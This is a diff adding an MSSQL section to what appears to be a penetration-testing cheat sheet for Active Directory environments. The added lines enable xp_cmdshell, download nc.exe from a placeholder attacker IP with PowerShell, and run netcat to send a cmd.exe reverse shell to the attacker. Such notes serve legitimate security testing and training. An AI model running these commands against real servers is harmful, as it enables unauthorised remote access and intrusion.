@@ -579,6 +579,14 @@ cat /etc/proxychains4.conf
 proxychains evil-winrm -i '<host>' -u '<username>'
 ```
 
+### :open_file_folder: MSSQL
+
+```mssql
+enable_xp_cmdshell /* sysadmin fixed server role */
+xp_cmdshell "powershell.exe wget http://<attacker ip>/nc.exe -OutFile c:\\Users\Public\\nc.exe"
+xp_cmdshell  "c:\\Users\Public\\nc.exe -e cmd.exe <attacker ip> <attacker port>"
+```
+
 ### :open_file_folder: Test Environment
 
 First we have to set up AD server, we can use the evaluation edition of windows sever. I chose to download the VHD version.
